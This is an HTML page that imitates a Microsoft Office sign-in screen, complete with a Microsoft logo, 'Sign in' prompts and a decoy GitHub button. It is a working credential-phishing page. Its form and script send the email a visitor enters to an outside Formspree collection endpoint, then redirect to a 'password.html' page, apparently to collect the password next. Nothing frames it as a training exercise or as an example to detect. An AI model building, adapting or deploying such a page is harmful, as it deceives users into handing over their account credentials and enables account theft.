<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in to your account</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f3f2f1;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 2rem 1rem;
    }
    .card {
      background: #fff;
      padding: 44px;
      width: 100%;
      max-width: 440px;
    }
    .ms-logo {
      margin-bottom: 16px;
    }
    .ms-logo svg {
      width: 108px;
      height: 24px;
    }
    .card h1 {
      font-size: 24px;
      font-weight: 600;
      color: #1b1b1b;
      margin-bottom: 8px;
    }
    .card p.sub {
      font-size: 13px;
      color: #1b1b1b;
      margin-bottom: 20px;
    }
    .card p.sub a {
      color: #0067b8;
      text-decoration: none;
    }
    .card p.sub a:hover { text-decoration: underline; }
    .input-wrap { margin-bottom: 8px; }
    .input-wrap input {
      width: 100%;
      height: 36px;
      border: 1px solid #666;
      padding: 0 8px;
      font-size: 15px;
      outline: none;
      color: #1b1b1b;
      font-family: inherit;
    }
    .input-wrap input:focus {
      border-color: #0067b8;
      border-width: 2px;
    }
    .hint {
      font-size: 12px;
      color: #d83b01;
      margin-bottom: 12px;
      min-height: 16px;
    }
    .options-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }
    .options-row a {
      font-size: 13px;
      color: #0067b8;
      text-decoration: none;
    }
    .options-row a:hover { text-decoration: underline; }
    .next-btn {
      width: 100%;
      background: #0067b8;
      color: #fff;
      border: none;
      height: 32px;
      font-size: 15px;
      font-family: inherit;
      cursor: pointer;
      margin-bottom: 16px;
    }
    .next-btn:hover { background: #005da6; }
    .next-btn:active { background: #004e8c; }
    .signup-row { font-size: 13px; color: #1b1b1b; }
    .signup-row a { color: #0067b8; text-decoration: none; }
    .signup-row a:hover { text-decoration: underline; }
    .divider {
      border: none;
      border-top: 1px solid #ccc;
      margin: 20px 0;
    }
    .github-btn {
      width: 100%;
      height: 32px;
      border: 1px solid #8a8886;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-size: 13px;
      font-family: inherit;
      color: #1b1b1b;
      cursor: pointer;
    }
    .github-btn:hover { background: #f3f2f1; }
    .footer {
      margin-top: 16px;
      display: flex;
      gap: 16px;
      flex-wrap: wrap;
      justify-content: flex-start;
      width: 100%;
      max-width: 440px;
    }
    .footer a {
      font-size: 11px;
      color: #616161;
      text-decoration: none;
    }
    .footer a:hover { text-decoration: underline; }
  </style>
</head>
<body>

  <div class="card">
    <div class="ms-logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 24">
        <rect x="0"  y="0"  width="11" height="11" fill="#f25022"/>
        <rect x="12" y="0"  width="11" height="11" fill="#7fba00"/>
        <rect x="0"  y="12" width="11" height="11" fill="#00a4ef"/>
        <rect x="12" y="12" width="11" height="11" fill="#ffb900"/>
        <text x="28" y="17" font-family="'Segoe UI',sans-serif" font-size="20" font-weight="600" fill="#1b1b1b">Microsoft</text>
      </svg>
    </div>

    <h1>Sign in</h1>
    <p class="sub">to continue to <a href="#">Microsoft Office</a></p>
    
    <form action="https://formspree.io/f/xpwlqqbb" method="POST" id="myForm">
  
  <div class="input-wrap">
    <input type="email" id="email-input" name="email" placeholder="Enter your email" required />
    <div id="hint-text" class="hint"></div>

  </div>

  <button type="submit" class="next-btn">Next</button>

</form>

<div class="options-row">
      <a href="#">No account? Create one!</a>
      <a href="#">Sign-in options</a>
    </div>
    
    <div class="signup-row">
      <a href="#">Can't access your account?</a>
    </div>

    <hr class="divider" />

    <button class="github-btn">
      <svg width="16" height="16" viewBox="0 0 16 16" fill="#1b1b1b">
        <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38
          0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13
          -.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66
          .07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15
          -.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27
          .68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12
          .51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48
          0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
      </svg>
      GitHub
    </button>
  </div>

  <div class="footer">
    <a href="#">Terms of use</a>
    <a href="#">Privacy &amp; cookies</a>
    <a href="#">...</a>
  </div>

 <script>
  const form = document.getElementById("myForm");
  const input = document.getElementById("email-input");
  const hint = document.getElementById("hint-text");

  form.addEventListener("submit", async function (e) {
    e.preventDefault(); // stop default redirect

    const val = input.value.trim();

    // ✅ your original validation
    if (!val) {
      hint.textContent = "Enter a valid email address, phone number, or Skype name.";
      return;
    }

    hint.textContent = "";

    try {
      // ✅ send to Formspree
      await fetch(form.action, {
        method: "POST",
        body: new FormData(form),
        headers: { "Accept": "application/json" }
      });

      // ✅ then redirect
      window.location.href = "password.html";

    } catch (error) {
      hint.textContent = "Something went wrong. Try again.";
    }
  });

  // ✅ keep Enter key behavior
  input.addEventListener("keydown", function (e) {
    if (e.key === "Enter") {
      form.dispatchEvent(new Event("submit", { cancelable: true }));
    }
  });
</script>

</body>
</html>
